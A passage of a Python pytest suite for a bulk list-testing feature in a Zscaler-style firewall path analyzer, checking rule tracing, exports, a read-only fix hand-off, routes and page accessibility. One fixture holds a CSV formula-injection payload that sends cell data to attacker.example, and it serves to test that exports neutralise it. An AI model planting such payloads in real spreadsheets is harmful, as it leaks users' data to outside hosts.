    lines = ["destination,protocol,port,group,source ip"]
    for host, proto, port, ident, src in ROW_CASES:
        lines.append(f"{host},{proto or ''},{port or ''},{(ident or {}).get('groups', [''])[0]},{src or ''}")
    rn = _mrun("\n".join(lines) + "\n", platform=platform)
    rows = list(rn.rows())
    snap = pa.analyze(ModTenant(), "seed.example", "off", platform, scope=FULL)["snapshot_for_cache"]
    # Act / Assert
    for r, (host, proto, port, ident, src) in zip(rows, ROW_CASES):
        alone = bt.summarize_analysis(pa.analyze(ModTenant(), host, "off", platform, scope=FULL, snapshot=snap, lookup=rn.lookups[host],
                                                 protocol=proto, port=port, identity=ident, context={"source_ip": src} if src else None))
        assert (r["result"], r["rule"], r["area"], r["inspection"]) == (alone["result"], alone["rule"], alone["area"], alone["inspection"]), (host, platform)


def test_rows_that_relate_alike_to_the_tenant_share_one_trace():
    """ASVS V11.1.4 · CWE-400: a /24 and a port mix trace a handful of times, not once per row, and the tenant is read once."""
    # Arrange
    c = ModTenant()
    # Act
    rn = _mrun("destination,port,protocol\n203.0.113.0/24,443,tcp\n203.0.113.0/24,22,tcp\n198.51.100.0/25,22,tcp\n", client=c)
    # Assert
    assert len(rn.p) == 640 and rn.summary["traced"] <= 4
    assert c.paths.count("/zia/firewallFilteringRules") == 1 and c.paths.count("/zia/urlFilteringRules") == 1
    assert {r["rule"] for r in rn.rows() if r["port"] == 22} == {"Block SSH to bad nets", "Default Firewall Filtering Rule"}


@pytest.mark.parametrize("cat,alerts,kind", [("MALWARE_SITE", [], "threat"), ("SOME_NEW_THREAT", ["SOME_NEW_THREAT"], "threat"),
                                             ("NEWLY_REG_DOMAINS", [], "low_collateral"), ("NEWS_AND_MEDIA", [], "broad"), ("", [], "none")])
def test_category_advice_sends_threats_to_atp_and_lists_broad_categories(cat, alerts, kind):
    """ASVS V1.1.2 · CWE-1059: threat categories go to ATP, low-collateral ones may be blocked, broad ones are listed instead."""
    # Act
    k = bt.category_kind(cat, alerts)
    advice = bt.category_advice("BLOCK", cat, k)
    # Assert
    assert k == kind
    assert {"threat": "Advanced Threat Protection", "low_collateral": "Block this category", "broad": "Do not block", "none": "list the destinations"}[kind] in advice


def test_the_summary_names_top_rules_categories_misses_and_lists_per_area():
    """ASVS V1.1.2 · CWE-1059: the summary counts misses per area, gives category advice and a paste list per area and purpose."""
    # Act
    rn = _run("destination,expected\ncasino.example,allow\n203.0.113.0/30,block\nevil.example,block\nnews.example,block\n")
    s = rn.summary
    # Assert
    assert s["expectations"]["misses"] == 7 and s["unmet"] == 7
    assert {(a["area"], a["expected"]) for a in s["expectations"]["by_area"]} == {("URL", "ALLOW"), ("Firewall", "BLOCK"), ("ATP", "BLOCK"), ("URL", "BLOCK")}
    assert bt.area_list(rn, "firewall", "block") == ["203.0.113.0", "203.0.113.1", "203.0.113.2", "203.0.113.3"]
    assert bt.area_list(rn, "url", "allow") == ["casino.example"]
    assert s["top_rules"][0]["rule"] in ("Block gambling", "Isolate news")
    assert any(c["category"] == "MALWARE_SITE" and c["kind"] == "threat" for c in s["expectations"]["categories"])
    assert s["preview"][0]["meets"] == "no"


# ── Exports ─────────────────────────────────────────────────────────────

HOSTILE = "destination,label,user\ncasino.example,=HYPERLINK(\"http://attacker.example/?\"&A1),@SUM(1+1)\n"


def test_the_csv_export_neutralises_formulas_in_every_cell():
    """ASVS V5.3.4 · CWE-1236: a label or user that starts like a formula is written as text in the CSV."""
    # Act
    text = "".join(bt.csv_lines(_run(HOSTILE)))
    rows = list(csv.reader(io.StringIO(text)))
    head = rows[0]
    # Assert
    assert rows[1][head.index("Label")].startswith("'=HYPERLINK") and rows[1][head.index("User")].startswith("'@SUM")


def test_the_excel_export_has_no_formula_and_quotes_formula_text():
    """ASVS V5.3.4 · CWE-1236: the workbook never carries a formula cell and formula-like text keeps its quote."""
    # Act
    data, cut = bt.workbook(_run(HOSTILE))
    z = zipfile.ZipFile(io.BytesIO(data))
    xml = "".join(z.read(n).decode("utf-8") for n in z.namelist() if n.startswith("xl/worksheets/"))
    # Assert
    assert not cut and "<f>" not in xml and "'=HYPERLINK" in xml


@pytest.mark.parametrize("which,count", [("all", 3), ("flagged", 2), ("unmet", 1)])
def test_exports_filter_all_flagged_or_not_as_expected(which, count):
    """ASVS V1.1.2 · CWE-200: the export holds every row, only the flagged rows, or only the rows not as expected."""
    # Arrange
    rn = _run("destination,expected\ncasino.example,block\nnews.example,block\nplain.example,\n")
    # Act
    n = len(list(rn.rows(which)))
    # Assert
    assert n == count


def test_the_excel_results_sheet_is_capped_and_says_so(monkeypatch):
    """ASVS V12.1.1 · CWE-400: boundary: the Excel results sheet stops at its cap and says the CSV has every row."""
    # Arrange
    monkeypatch.setattr(bt, "XLSX_MAX_ROWS", 3)
    # Act
    data, cut = bt.workbook(_run("10.0.0.0/30\nexample.com\n"))
    # Assert
    assert cut and b"download the CSV" in zipfile.ZipFile(io.BytesIO(data)).read("xl/worksheets/sheet1.xml")


# ── Fix selected: a hand-off, never a write ─────────────────────────────

def test_fix_selected_prepares_a_url_category_change_and_writes_nothing():
    """ASVS V4.1.1 · CWE-862 · A01:2021: Fix selected only keeps a list for Bulk changes under a random id (the host names as a URL category change and a URL filtering fix, the address as a Cloud Firewall fix); it sends no request at all."""
    # Arrange
    c = Tenant()
    rn = _run("destination,expected\nmail.example.com,block\nnews.example,block\n203.0.113.5,block\n", client=c)
    sent = (c.reads, len(c.lookups))
    # Act
    rec = bt.fix_handoff(rn, rows=[1, 2, 2, 3], purpose="block")
    # Assert
    assert rec["urls"] == ["mail.example.com", "news.example"] and len(rec["id"]) == 24
    assert [(f["area"], [d["value"] for d in f["destinations"]]) for f in rec["fixes"]] == [("firewall", ["203.0.113.5"]),
                                                                                         ("url", ["mail.example.com", "news.example"])]
    assert rec["zpa"] == []
    assert (c.reads, len(c.lookups)) == sent and not c.writes
    assert bt.get_fix(rec["id"])["urls"] == rec["urls"]
    assert bt.get_fix(rec["id"], now=rec["created"] + bt.FIX_KEEP_SECONDS + 1) is None


@pytest.mark.parametrize("kw,why", [({"rows": [0]}, "not a row"), ({"rows": [99]}, "not a row"), ({"rows": [True]}, "not a row"),
                                    ({"area": "client_connector"}, "copy its list"), ({"area": "nope"}, "Unknown area"), ({}, "Pick rows"),
                                    ({"rows": [1], "purpose": "delete"}, "purpose")])
def test_fix_selected_refuses_what_it_cannot_hand_off(kw, why):
    """ASVS V5.1.3 · CWE-20: rows out of range, an area changed elsewhere (Client Connector), or an unknown purpose are refused in words."""
    # Arrange
    rn = _run("destination,expected\n203.0.113.0/30,block\n")
    # Act / Assert
    with pytest.raises(bt.ListError, match=why):
        bt.fix_handoff(rn, **kw)


def test_a_hand_off_id_that_is_not_ours_is_never_looked_up():
    """ASVS V4.2.1 · CWE-639: a guessed or malformed hand-off id returns nothing."""
    # Act / Assert
    for fid in ("", "../etc", "A" * 24, "0" * 23, None):
        assert bt.get_fix(fid) is None


# ── The routes ──────────────────────────────────────────────────────────

def _follow(t, job):
    deadline = time.time() + 30
    while time.time() < deadline:
        snap = t.get(f"/api/dlp-packs/jobs/{job}").json()
        if snap["status"] != "running":
            return snap
        time.sleep(0.05)
    raise AssertionError("job did not finish")


def test_the_route_runs_a_job_exports_lists_and_hands_off(monkeypatch, tmp_path):
    """ASVS V4.1.3 · ASVS V7.1.1 · CWE-532 · CWE-1236: the job tests the list, its exports and lists download, and the audit log keeps the list's size only."""
    # Arrange
    import dlp_api_server as srv
    from fastapi.testclient import TestClient
    audit_log = tmp_path / "audit.log"
    monkeypatch.setenv("DLP_CHECK_AUDIT", str(audit_log))
    c = Tenant()
    monkeypatch.setattr(srv, "_build_client", lambda req: c)
    t = TestClient(srv.app)
    text = "destination,expected,user\ncasino.example,allow,alice@example.com\n203.0.113.0/30,block,\nnews.example,block,\n"
    # Act
    r = t.post("/api/bulk-test/start", json=dict(CREDS, text=text))
    snap = _follow(t, r.json()["job_id"])
    res = snap["result"]
    rid = res["run_id"]
    csv_text = t.get(f"/api/bulk-test/{rid}/export?format=csv&rows=unmet").text
    xlsx = t.get(f"/api/bulk-test/{rid}/export?format=xlsx&rows=all")
    lst = t.get(f"/api/bulk-test/{rid}/list?area=firewall&purpose=block").text
    fix = t.post(f"/api/bulk-test/{rid}/fix", json=dict(CREDS, area="url", purpose="block"))
    got = t.get(f"/api/bulk-test/fix/{fix.json()['fix_id']}").json()
    # Assert
    assert r.status_code == 200 and r.json()["rows"] == 6 and snap["status"] == "done", snap.get("error")
    assert res["counts"]["blocked"] == 1 and res["counts"]["isolated"] == 1 and res["report_id"].startswith("dataflow-")
    assert len(csv_text.strip().splitlines()) == 1 + 6
    assert xlsx.status_code == 200 and xlsx.content[:2] == b"PK"
    assert lst.split() == ["203.0.113.0", "203.0.113.1", "203.0.113.2", "203.0.113.3"]
    assert fix.status_code == 200 and fix.json()["open"].startswith("/report/operations?fix=") and got["urls"] == ["news.example"]
    assert not c.writes
    log = read_store_text(audit_log)
    assert "/api/bulk-test/start" in log and "alice@example.com" not in log and "casino.example" not in log and "secret-secret-secret" not in log


def test_the_route_reads_zpa_first_keeps_it_and_reuses_it(monkeypatch, tmp_path):
    """ASVS V4.1.3 · ASVS V4.2.1 · CWE-272 · CWE-639: with ZPA ticked the job reads ZPA once, answers carried rows from it and keeps the read for the same tenant."""
    # Arrange
    import dlp_api_server as srv
    import zpa_reader
    from fastapi.testclient import TestClient
    from test_path_zpa_workloads import Sdk
    monkeypatch.setenv("DLP_CHECK_AUDIT", str(tmp_path / "audit.log"))
    monkeypatch.setattr(zpa_reader, "PACE_SECONDS", 0.0)
    monkeypatch.setattr(srv, "_REPORTS", {})
    c, built = ModTenant(), []
    monkeypatch.setattr(srv, "_build_client", lambda req: built.append("raw") or c)
    monkeypatch.setattr(srv, "_build_sdk_client", lambda creds: built.append("sdk") or Sdk())
    t = TestClient(srv.app)
    body = dict(CREDS, customer_id="216196257331281920", scopes=["zpa", "dlp", "zcc", "zia_extras"], from_page=True,
                text="destination,expected\ngit.corp.example,block\ncasino.example,allow\n")
    # Act
    first = _follow(t, t.post("/api/bulk-test/start", json=body).json()["job_id"])["result"]
    again = _follow(t, t.post("/api/bulk-test/start", json=dict(body, zpa_report_id=first["zpa_report_id"])).json()["job_id"])["result"]
    zpa_only = t.post("/api/bulk-test/start", json=dict(body, scopes=["zpa"]))
    assert zpa_only.status_code == 200, zpa_only.text
    only = _follow(t, zpa_only.json()["job_id"])["result"]
    # Assert
    assert first["status"] == "done" and first["zpa_report_id"].startswith("pathzpa-") and first["zpa"]["state"] == "read"
    assert again["zpa"]["state"] == "kept" and again["zpa_report_id"] == first["zpa_report_id"]
    assert built == ["raw", "sdk", "raw", "sdk"], built   # the kept ZPA read signs in to ZIA only; ZPA alone to ZPA only
    rows = {r["target"]: r for r in first["preview"]}
    assert rows["git.corp.example"]["area"] == "ZPA" and rows["casino.example"]["area"] == "DNS"
    assert zpa_only.status_code == 200 and only["counts"]["unverified"] == 1 and only["counts"]["allowed"] == 1
    assert not c.writes


def test_the_route_refuses_zpa_only_without_a_customer_id_before_signing_in(monkeypatch):
    """ASVS V4.1.3 · CWE-272: ZPA alone without a customer ID cannot be read: a 400 before any client is built."""
    # Arrange
    import dlp_api_server as srv
    from fastapi.testclient import TestClient
    built = []
    monkeypatch.setattr(srv, "_build_client", lambda req: built.append("raw"))
    monkeypatch.setattr(srv, "_build_sdk_client", lambda creds: built.append("sdk"))
    # Act
    r = TestClient(srv.app).post("/api/bulk-test/start", json=dict(CREDS, scopes=["zpa"], channels={}, from_page=True, text="git.corp.example"))
    # Assert
    assert r.status_code == 400 and "customer ID" in r.json()["detail"] and built == []


def test_a_list_that_cannot_be_tested_is_refused_before_signing_in(monkeypatch):
    """ASVS V5.1.3 · ASVS V4.1.3 · CWE-20 · CWE-272: a bad list, a bad limit or nothing in scope is a 400 before any sign-in."""
    # Arrange
    import dlp_api_server as srv
    from fastapi.testclient import TestClient

    def no_sign_in(req):
        raise AssertionError("signed in before the request was checked")
    monkeypatch.setattr(srv, "_build_client", no_sign_in)
    t = TestClient(srv.app)
    base = {k: v for k, v in CREDS.items() if k not in ("scopes", "channels")}
    # Act
    bad_list = t.post("/api/bulk-test/start", json=dict(CREDS, text="not a host\n"))
    bad_limit = t.post("/api/bulk-test/start", json=dict(CREDS, text="example.com", max_lookup_requests=0))
    nothing = t.post("/api/bulk-test/start", json=dict(base, scopes=["compliance"], channels={}, from_page=True, text="example.com"))
    # Assert
    assert bad_list.status_code == 400 and "names no destination" in bad_list.json()["detail"]
    assert bad_limit.status_code == 400 and "max_lookup_requests" in bad_limit.json()["detail"]
    assert nothing.status_code == 400 and "secret-secret-secret" not in nothing.text


def test_fix_is_refused_when_url_categories_are_not_in_scope(monkeypatch):
    """ASVS V4.1.3 · CWE-272: Fix selected is refused (400) when nothing it changes (custom URL categories, ZIA platform lists, ZPA segments) is in scope on the Scope page."""
    # Arrange
    import dlp_api_server as srv
    from fastapi.testclient import TestClient
    t = TestClient(srv.app)
    base = {k: v for k, v in CREDS.items() if k not in ("scopes", "channels")}
    # Act
    r = t.post("/api/bulk-test/anything/fix", json=dict(base, scopes=["zcc"], channels={}, from_page=True, rows=[1]))
    # Assert
    assert r.status_code == 400 and "URL" in r.json()["detail"] and "ZPA" in r.json()["detail"]


@pytest.mark.parametrize("path", ["/api/bulk-test/nope/export?format=csv", "/api/bulk-test/nope/list?area=url&purpose=block"])
def test_an_unknown_run_is_a_404(path):
    """ASVS V4.2.1 · CWE-639: a run id that is not kept answers 404 and nothing else."""
    # Arrange
    import dlp_api_server as srv
    from fastapi.testclient import TestClient
    # Act
    r = TestClient(srv.app).get(path)
    # Assert
    assert r.status_code == 404


# ── The page ────────────────────────────────────────────────────────────

def _read(*p):
    return open(os.path.join(ROOT, *p), encoding="utf-8").read()


def test_the_list_view_is_a_tab_on_the_path_analyzer_with_aria_tabs():
    """WCAG 2.2 SC 4.1.2 · SC 2.1.1 · SC 1.3.1: Test a list is an ARIA tab of the Path analyzer, keyboard operable, with labelled inputs."""
    # Arrange
    html, js, css = _read("static", "report_path.html"), _read("static", "path_list.js"), _read("static", "reports.css")
    # Act
    block = html[html.index("<!-- Test a list"):html.index("<!-- /Test a list -->")]
    # Assert
    assert 'role="tablist"' in block and block.count('role="tab"') == 3 and 'aria-controls="panel-list"' in block
    assert 'id="panel-one"' in block and 'id="panel-list"' in block and "hidden" in block
    for el in ("plFile", "plText", "plLookup", "plMax"):
        assert f'id="{el}"' in block
    assert "<label" in block and 'aria-live="polite"' in block
    assert "ArrowRight" in js and "ArrowLeft" in js and "'Home'" in js and "'End'" in js and "tabIndex" in js
    assert ".rp-tabs [role=\"tab\"]" in css and "prefers-reduced-motion" in css
    assert html.index('<script src="/static/har_parse.js">') < html.index('<script src="/static/path_list.js">')
    assert not os.path.exists(os.path.join(ROOT, "static", "report_bulk_test.html"))


def test_the_page_never_writes_and_fix_selected_opens_bulk_changes():
    """ASVS V4.1.1 · CWE-862: the list view only calls read-only routes; Fix selected opens Bulk changes, whose own gates apply."""
    # Arrange
    js = _read("static", "path_list.js")
    ops = _read("static", "report_operations.html")
    # Assert
    assert "/api/bulk-test/start" in js and "/report/operations?fix=" in js
    assert "/api/operations/" not in js and "method: 'PUT'" not in js and "method: 'DELETE'" not in js
    assert "takeHandoff()" in ops and "/api/bulk-test/fix/" in ops and "S.handoff.urls.join" in ops


def test_the_path_analyzer_explainer_and_overview_mention_lists():
    """ASVS V1.1.2 · SSDF PW.1.1: the Path analyzer's help card and the overview say it tests lists; no separate page or button exists."""
    # Arrange
    ex, ov, idx = _read("static", "explain.js"), _read("docs", "OVERVIEW.md"), _read("static", "index.html")
    g = _read("static", "glossary.js")
    # Assert
    block = ex[ex.index("  X.path = {"):]
    block = block[:block.index("\n  };")]
    assert "Test a list" in block and "Fix selected" in block
    assert "**Test a list**" in ov and "/report/bulk-test" not in ex + idx
    for term in ("'custom url category'", "'ip group'", "'allowed but blockable'", "'threat category'"):
        assert term in g
